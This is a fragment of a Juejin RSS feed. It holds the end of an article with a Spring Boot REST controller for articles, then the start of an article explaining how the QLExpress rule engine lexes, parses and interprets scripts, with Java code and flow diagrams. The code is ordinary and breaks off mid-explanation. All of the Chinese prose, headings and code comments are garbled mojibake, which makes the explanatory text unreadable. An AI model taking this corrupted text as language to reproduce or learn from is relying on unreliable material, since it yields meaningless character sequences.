<h4 data-id="heading-10">2.6. Contriller ä¸­è®¾ç½® API æ¥å£</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> io.github.somehow.mysite.commons.framework.result.Result;
<span class="hljs-keyword">import</span> io.github.somehow.mysite.commons.framework.web.Results;
<span class="hljs-keyword">import</span> io.github.somehow.mysite.dto.req.article.*;
<span class="hljs-keyword">import</span> io.github.somehow.mysite.dto.resp.ArticlePageQueryRespDTO;
<span class="hljs-keyword">import</span> io.github.somehow.mysite.dto.resp.ArticleSelectRespDTO;
<span class="hljs-keyword">import</span> io.github.somehow.mysite.service.ArticleService;
<span class="hljs-keyword">import</span> io.swagger.v3.oas.annotations.Operation;
<span class="hljs-keyword">import</span> io.swagger.v3.oas.annotations.tags.Tag;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;

<span class="hljs-comment">/**
 * æ–‡ç« æ•°æ®æ§åˆ¶å±‚
 */</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-meta">@Tag(name = <span class="hljs-string">"æ–‡ç« æ•°æ®ç®¡ç†"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArticleController</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArticleService articleService;

    <span class="hljs-meta">@Operation(summary = <span class="hljs-string">"åˆ›å»ºæ–‡ç« "</span>)</span>
    <span class="hljs-meta">@PostMapping(<span class="hljs-string">"/api/article/create"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; createArticle(<span class="hljs-meta">@RequestBody</span> ArticleCreateReqDTO requestParam) {
        articleService.createArticle(requestParam);
        <span class="hljs-keyword">return</span> Results.success();
    }

    <span class="hljs-meta">@Operation(summary = <span class="hljs-string">"æ›´æ–°æ–‡ç« "</span>)</span>
    <span class="hljs-meta">@PutMapping(<span class="hljs-string">"/api/article/update"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; updateArticle(<span class="hljs-meta">@RequestBody</span> ArticleUpdateReqDTO requestParam) {
        articleService.updateArticle(requestParam);
        <span class="hljs-keyword">return</span> Results.success();
    }

    <span class="hljs-meta">@Operation(summary = <span class="hljs-string">"åˆ é™¤æ–‡ç« "</span>)</span>
    <span class="hljs-meta">@DeleteMapping(<span class="hljs-string">"/api/article/delete/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; deleteArticle(<span class="hljs-meta">@PathVariable(<span class="hljs-string">"id"</span>)</span> String id) {
        articleService.deleteArticle(<span class="hljs-built_in">Long</span>.parseLong(id));
        <span class="hljs-keyword">return</span> Results.success();
    }

    <span class="hljs-meta">@Operation(summary = <span class="hljs-string">"åˆ†é¡µæœç´¢æ–‡ç« ä¿¡æ¯"</span>)</span>
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/api/article/search"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;IPage&lt;ArticlePageQueryRespDTO&gt;&gt; pageQueryArticle(ArticlePageQueryReqDTO requestParam) {
        <span class="hljs-keyword">return</span> Results.success(articleService.pageQueryArticle(requestParam));
    }

}
</code></pre>
<p>å¦‚æœæœ‰é”™è¯¯æˆ–çº°æ¼ï¼Œæ¬¢è¿å¤§å®¶åœ¨è¯„è®ºåŒºç•™è¨€æŒ‡æ­£ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘¨æœ«æ‹†è§£ï¼šQLExpress å¦‚ä½•åšåˆ°ä¸ç¼–è¯‘å°±èƒ½æ‰§è¡Œï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582814236584329254</link>    <guid>https://juejin.cn/post/7582814236584329254</guid>    <pubDate>2025-12-13T07:30:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582814236584329254" data-draft-id="7582849187865395251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" å‘¨æœ«æ‹†è§£ï¼šQLExpress å¦‚ä½•åšåˆ°ä¸ç¼–è¯‘å°±èƒ½æ‰§è¡Œï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,æ¶æ„,ç®—æ³•"/> <meta itemprop="datePublished" content="2025-12-13T07:30:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             å‘¨æœ«æ‹†è§£ï¼šQLExpress å¦‚ä½•åšåˆ°ä¸ç¼–è¯‘å°±èƒ½æ‰§è¡Œï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T07:30:31.000Z" title="Sat Dec 13 2025 07:30:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆè¦æ‹†è§£è¿™ä¸ªè½®å­</h2>
<p>é¡¹ç›®é‡Œç”¨äº† QLExpress åšè§„åˆ™å¼•æ“ï¼Œé…ç½®æ»¡å‡è§„åˆ™ã€ç§¯åˆ†è®¡ç®—ä¹‹ç±»çš„éœ€æ±‚ã€‚ä¸€ç›´æœ‰å‡ ä¸ªç–‘é—®ï¼š</p>
<p><strong>ç–‘é—®1ï¼šå®ƒä¸ç”Ÿæˆ class æ–‡ä»¶ï¼Œæ€ä¹ˆæ‰§è¡Œ if è¯­å¥ï¼Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>;
<span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> runner.execute(script);  <span class="hljs-comment">// ç›´æ¥å°±èƒ½è·‘ï¼Ÿ</span>
</code></pre>
<p><strong>ç–‘é—®2ï¼šå®ƒæ€ä¹ˆè°ƒç”¨æˆ‘è‡ªå·±å†™çš„ Java ç±»ï¼Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java">runner.addFunctionOfClassMethod(<span class="hljs-string">"æŠ˜æ‰£"</span>, MyMath.class.getName(), <span class="hljs-string">"discount"</span>, ...);
<span class="hljs-comment">// è„šæœ¬é‡Œå°±èƒ½ç”¨ï¼šæŠ˜æ‰£(amount, 0.8)</span>
</code></pre>
<p><strong>ç–‘é—®3ï¼šè¿ç®—ç¬¦ä¼˜å…ˆçº§æ€ä¹ˆä¿è¯ï¼Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-string">"2 + 3 * 4"</span>  <span class="hljs-comment">// æ€ä¹ˆçŸ¥é“å…ˆç®—ä¹˜æ³•ï¼Ÿ</span>
</code></pre>
<p>å‘¨æœ«æ­£å¥½æœ‰æ—¶é—´ï¼ŒèŠ±äº†ä¸€å¤©æ‰‹å†™äº†ä¸€ä¸ª 700 è¡Œçš„æç®€ç‰ˆï¼ŒæŠŠè¿™äº›é—®é¢˜éƒ½ææ¸…æ¥šäº†ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€æ•´ä½“æµç¨‹ï¼šä»å­—ç¬¦ä¸²åˆ°ç»“æœ</h2>
<p>å…ˆçœ‹å…¨å±€ï¼ŒQLExpress æŠŠè„šæœ¬æ‰§è¡Œåˆ†æˆä¸‰ä¸ªé˜¶æ®µï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[è„šæœ¬å­—ç¬¦ä¸²] --&gt; B[è¯æ³•åˆ†æ&lt;br/&gt;Lexer]
    B --&gt; C[Tokenæµ]
    C --&gt; D[è¯­æ³•åˆ†æ&lt;br/&gt;Parser]
    D --&gt; E[ASTæ ‘]
    E --&gt; F[è§£é‡Šæ‰§è¡Œ&lt;br/&gt;Interpreter]
    F --&gt; G[ç»“æœ]
</code></pre>
<p><strong>ä¸¾ä¸ªä¾‹å­</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java">è¾“å…¥è„šæœ¬ï¼š<span class="hljs-keyword">if</span> (amount &gt; <span class="hljs-number">100</span>) amount * <span class="hljs-number">0.8</span>
ä¸Šä¸‹æ–‡å˜é‡ï¼šamount = <span class="hljs-number">150</span>
</code></pre>
<h3 data-id="heading-2">é˜¶æ®µä¸€ï¼šè¯æ³•åˆ†æï¼ˆæŠŠå­—ç¬¦ä¸²åˆ‡æˆè¯ï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss">è¾“å…¥ï¼š"if (amount &gt; <span class="hljs-number">100</span>) amount * <span class="hljs-number">0.8</span>"
è¾“å‡ºï¼š<span class="hljs-selector-attr">[IF]</span> <span class="hljs-selector-attr">[LPAREN]</span> <span class="hljs-selector-attr">[IDENTIFIER:amount]</span> <span class="hljs-selector-attr">[GREATER]</span> <span class="hljs-selector-attr">[NUMBER:100]</span> <span class="hljs-selector-attr">[RPAREN]</span> 
      <span class="hljs-selector-attr">[IDENTIFIER:amount]</span> <span class="hljs-selector-attr">[MULTIPLY]</span> <span class="hljs-selector-attr">[NUMBER:0.8]</span>
</code></pre>
<p>å°±åƒä¸­æ–‡åˆ†è¯ï¼ŒæŠŠä¸€å¥è¯åˆ‡æˆä¸€ä¸ªä¸ªå•è¯ã€‚ä»£ç é‡Œç”¨çŠ¶æ€æœºå®ç°ï¼Œé€ä¸ªå­—ç¬¦æ‰«æã€‚</p>
<h3 data-id="heading-3">é˜¶æ®µäºŒï¼šè¯­æ³•åˆ†æï¼ˆæŠŠè¯ç»„è£…æˆæ ‘ï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss">Tokenæµ â†’ ASTæ ‘

         IfNode
        /      \
   æ¡ä»¶èŠ‚ç‚¹    æ‰§è¡ŒèŠ‚ç‚¹
  (amount&gt;<span class="hljs-number">100</span>) (amount*<span class="hljs-number">0.8</span>)
       |            |
  BinaryOpNode  BinaryOpNode
    /    \        /    \
  amount <span class="hljs-number">100</span>   amount  <span class="hljs-number">0.8</span>
</code></pre>
<p>å°±åƒé€ å¥ï¼ŒæŠŠå•è¯ç»„æˆæœ‰ç»“æ„çš„å¥å­ã€‚ä»£ç é‡Œç”¨é€’å½’ä¸‹é™å®ç°ï¼Œä¸€å±‚å±‚å¾€ä¸‹è§£æã€‚</p>
<h3 data-id="heading-4">é˜¶æ®µä¸‰ï¼šè§£é‡Šæ‰§è¡Œï¼ˆéå†æ ‘ç®—ç»“æœï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini">éå† IfNodeï¼š
  1. å…ˆæ‰§è¡Œæ¡ä»¶èŠ‚ç‚¹ï¼š150 &gt; <span class="hljs-attr">100</span> = <span class="hljs-literal">true</span>
  2. å› ä¸ºæ¡ä»¶ä¸º trueï¼Œæ‰§è¡Œ then åˆ†æ”¯
  3. æ‰§è¡Œ then èŠ‚ç‚¹ï¼š150 * <span class="hljs-attr">0.8</span> = <span class="hljs-number">120</span>
  4. è¿”å›ç»“æœï¼š120
</code></pre>
<p>ä¸ç”Ÿæˆå­—èŠ‚ç ï¼Œç›´æ¥ç”¨ Java ä»£ç éå†æ ‘æ‰§è¡Œã€‚</p>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€æ ¸å¿ƒåŸç†ä¸€ï¼šif è¯­å¥çš„ç§˜å¯†</h2>
<h3 data-id="heading-6">å…³é”®é—®é¢˜</h3>
<p>QLExpress çš„ if åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ JVM çš„ if æŒ‡ä»¤å—ï¼Ÿ</p>
<h3 data-id="heading-7">ç­”æ¡ˆï¼šç”¨ Java çš„ if åŒ…è£…</h3>
<p><strong>å…ˆçœ‹ Groovy çš„åšæ³•</strong>ï¼ˆç¼–è¯‘æˆå­—èŠ‚ç ï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Groovy ä¼šæŠŠè„šæœ¬ç¼–è¯‘æˆçœŸæ­£çš„ class</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Script123</span> {
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (amount &gt; <span class="hljs-number">100</span>) {  <span class="hljs-comment">// â† è¿™æ˜¯ JVM çš„ if æŒ‡ä»¤</span>
            <span class="hljs-keyword">return</span> amount * <span class="hljs-number">0.8</span>;
        }
    }
}
</code></pre>
<p><strong>å†çœ‹ QLExpress çš„åšæ³•</strong>ï¼ˆç”¨ Java ä»£ç æ¨¡æ‹Ÿï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. Parser è§£ææ—¶ï¼Œè¯†åˆ« if å…³é”®å­—</span>
<span class="hljs-keyword">if</span> (peek().getType() == TokenType.IF) {
    <span class="hljs-keyword">return</span> parseIfStatement();  <span class="hljs-comment">// æ„é€  IfNode</span>
}

<span class="hljs-comment">// 2. æ„é€  AST èŠ‚ç‚¹</span>
IfNode {
    condition: BinaryOpNode(amount, &gt;, <span class="hljs-number">100</span>)
    thenBranch: BinaryOpNode(amount, *, <span class="hljs-number">0.8</span>)
}

<span class="hljs-comment">// 3. Interpreter æ‰§è¡Œæ—¶</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">interpretIf</span><span class="hljs-params">(IfNode node, Context context)</span> {
    <span class="hljs-comment">// å…ˆè®¡ç®—æ¡ä»¶è¡¨è¾¾å¼</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">condResult</span> <span class="hljs-operator">=</span> interpret(node.getCondition(), context);
    
    <span class="hljs-comment">// ç”¨ Java çš„ if åˆ¤æ–­</span>
    <span class="hljs-keyword">if</span> (condResult <span class="hljs-keyword">instanceof</span> Boolean &amp;&amp; (Boolean) condResult) {
        <span class="hljs-keyword">return</span> interpret(node.getThenBranch(), context);  <span class="hljs-comment">// æ‰§è¡Œ then åˆ†æ”¯</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p><strong>æ ¸å¿ƒå·®å¼‚</strong>ï¼š</p>
<pre><code class="hljs">Groovyï¼š  è„šæœ¬çš„ if â†’ ç¼–è¯‘æˆ JVM çš„ if æŒ‡ä»¤
QLExpressï¼šè„šæœ¬çš„ if â†’ æ„é€  IfNode â†’ ç”¨ Java çš„ if æ¨¡æ‹Ÿæ‰§è¡Œ
</code></pre>
<h3 data-id="heading-8">æ‰§è¡Œæµç¨‹å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[è„šæœ¬: if amount&gt;100] --&gt; B[Lexerè¯†åˆ«å…³é”®å­— IF]
    B --&gt; C[Parser.parseIfStatement]
    C --&gt; D[æ„é€  IfNode]
    D --&gt; E[å­˜å‚¨ condition å’Œ thenBranch]
    E --&gt; F[Interpreter.interpretIf]
    F --&gt; G[å…ˆæ‰§è¡Œ condition èŠ‚ç‚¹]
    G --&gt; H{ç»“æœæ˜¯ true?}
    H --&gt;|æ˜¯| I[æ‰§è¡Œ thenBranch èŠ‚ç‚¹]
    H --&gt;|å¦| J[è¿”å› null]
    I --&gt; K[è¿”å›ç»“æœ]
</code></pre>
<p><strong>å…³é”®ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Parser.java - å¦‚ä½•è¯†åˆ« if è¯­å¥</span>
<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseIfStatement</span><span class="hljs-params">()</span> {
    consumeToken(TokenType.IF);           <span class="hljs-comment">// æ¶ˆè´¹ 'if'</span>
    consumeToken(TokenType.LPAREN);       <span class="hljs-comment">// æ¶ˆè´¹ '('</span>
    <span class="hljs-type">ASTNode</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> parseExpression(); <span class="hljs-comment">// é€’å½’è§£ææ¡ä»¶ï¼ˆé‡ç‚¹ï¼ï¼‰</span>
    consumeToken(TokenType.RPAREN);       <span class="hljs-comment">// æ¶ˆè´¹ ')'</span>
    <span class="hljs-type">ASTNode</span> <span class="hljs-variable">thenBranch</span> <span class="hljs-operator">=</span> parseExpression();<span class="hljs-comment">// é€’å½’è§£æ then åˆ†æ”¯ï¼ˆé‡ç‚¹ï¼ï¼‰</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IfNode</span>(condition, thenBranch, <span class="hljs-literal">null</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-9">å››ã€æ ¸å¿ƒåŸç†äºŒï¼šå¦‚ä½•è°ƒç”¨è‡ªå®šä¹‰æ–¹æ³•</h2>
<h3 data-id="heading-10">å…³é”®é—®é¢˜</h3>
<p>è„šæœ¬é‡Œæ€ä¹ˆè°ƒç”¨ MyMath.discount è¿™ä¸ªæˆ‘è‡ªå·±å†™çš„æ–¹æ³•ï¼Ÿ</p>
<h3 data-id="heading-11">ç­”æ¡ˆï¼šæ³¨å†Œ + åå°„</h3>
<p><strong>ç¬¬ä¸€æ­¥ï¼šæ³¨å†Œæ–¹æ³•</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·ä»£ç </span>
runner.register(<span class="hljs-string">"MyMath"</span>, MyMath.class);

<span class="hljs-comment">// QLExpress å†…éƒ¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(String name, Class&lt;?&gt; clazz)</span> {
    context.registerFunction(name, clazz);  <span class="hljs-comment">// å­˜åˆ° Map é‡Œ</span>
}
</code></pre>
<p><strong>ç¬¬äºŒæ­¥ï¼šè§£æå‡½æ•°è°ƒç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è„šæœ¬ï¼š"MyMath.discount(amount, 0.8)"</span>
<span class="hljs-comment">// Parser è¯†åˆ«åˆ°ï¼šIDENTIFIER.IDENTIFIER(...)</span>
<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseFunctionCall</span><span class="hljs-params">(String className, String methodName)</span> {
    List&lt;ASTNode&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-comment">// è§£æå‚æ•°åˆ—è¡¨</span>
    <span class="hljs-keyword">do</span> {
        args.add(parseExpression());  <span class="hljs-comment">// é€’å½’è§£ææ¯ä¸ªå‚æ•°</span>
    } <span class="hljs-keyword">while</span> (match(TokenType.COMMA));
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctionCallNode</span>(className, methodName, args);
}
</code></pre>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šåå°„è°ƒç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Interpreter.java</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">interpretFunctionCall</span><span class="hljs-params">(FunctionCallNode node, Context context)</span> {
    <span class="hljs-comment">// 1. ä»æ³¨å†Œè¡¨æ‰¾åˆ°ç±»</span>
    Class&lt;?&gt; clazz = context.getFunctionClass(node.getClassName());
    
    <span class="hljs-comment">// 2. å‡†å¤‡å‚æ•°</span>
    Object[] argValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[node.getArguments().size()];
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; argValues.length; i++) {
        argValues[i] = interpret(node.getArguments().get(i), context);
    }
    
    <span class="hljs-comment">// 3. åå°„è°ƒç”¨</span>
    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(node.getMethodName(), getArgTypes(argValues));
    <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-literal">null</span>, argValues);  <span class="hljs-comment">// è°ƒç”¨é™æ€æ–¹æ³•</span>
}
</code></pre>
<h3 data-id="heading-12">æ‰§è¡Œæµç¨‹å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[æ³¨å†Œ: MyMath.class] --&gt; B[å­˜å…¥ Map]
    C[è„šæœ¬: MyMath.discount] --&gt; D[Parserè¯†åˆ«å‡½æ•°è°ƒç”¨]
    D --&gt; E[æ„é€  FunctionCallNode]
    E --&gt; F[Interpreteræ‰§è¡Œ]
    F --&gt; G[ä»Mapå–å‡º MyMath.class]
    G --&gt; H[å‡†å¤‡å‚æ•°: 150, 0.8]
    H --&gt; I[åå°„: method.invoke]
    I --&gt; J[è¿”å›ç»“æœ: 120]
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå®‰å…¨ï¼Ÿ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">åªèƒ½è°ƒç”¨æ³¨å†Œè¿‡çš„ç±»ï¼ˆç™½åå•æœºåˆ¶ï¼‰
è„šæœ¬é‡Œå†™ System.<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>) ä¹Ÿæ²¡ç”¨ï¼Œå› ä¸ºæ²¡æ³¨å†Œ
</code></pre>
<hr/>
<h2 data-id="heading-13">äº”ã€æ ¸å¿ƒåŸç†ä¸‰ï¼šè¿ç®—ç¬¦ä¼˜å…ˆçº§å¦‚ä½•ä¿è¯</h2>
<h3 data-id="heading-14">å…³é”®é—®é¢˜</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-string">"2 + 3 * 4"</span>  <span class="hljs-comment">// ç»“æœæ˜¯ 14ï¼Œè¯´æ˜å…ˆç®—ä¹˜æ³•</span>
</code></pre>
<p>Parser æ€ä¹ˆçŸ¥é“å…ˆç®—å“ªä¸ªï¼Ÿ</p>
<h3 data-id="heading-15">ç­”æ¡ˆï¼šé€’å½’ä¸‹é™ + è°ƒç”¨é“¾å±‚æ¬¡</h3>
<p><strong>è°ƒç”¨é“¾è®¾è®¡</strong>ï¼ˆä¼˜å…ˆçº§ä»ä½åˆ°é«˜ï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java">parseExpression()       <span class="hljs-comment">// å…¥å£</span>
    â†“
parseConditional()      <span class="hljs-comment">// if è¯­å¥ï¼ˆä¼˜å…ˆçº§æœ€ä½ï¼‰</span>
    â†“
parseComparison()       <span class="hljs-comment">// æ¯”è¾ƒè¿ç®— &gt;, &lt;, ==</span>
    â†“
parseTerm()             <span class="hljs-comment">// åŠ å‡è¿ç®— +, -</span>
    â†“
parseFactor()           <span class="hljs-comment">// ä¹˜é™¤è¿ç®— *, /</span>
    â†“
parsePrimary()          <span class="hljs-comment">// åŸºæœ¬å…ƒç´ ï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼‰</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<p>çœ‹ä¸ªä¾‹å­ï¼š<code>2 + 3 * 4</code></p>
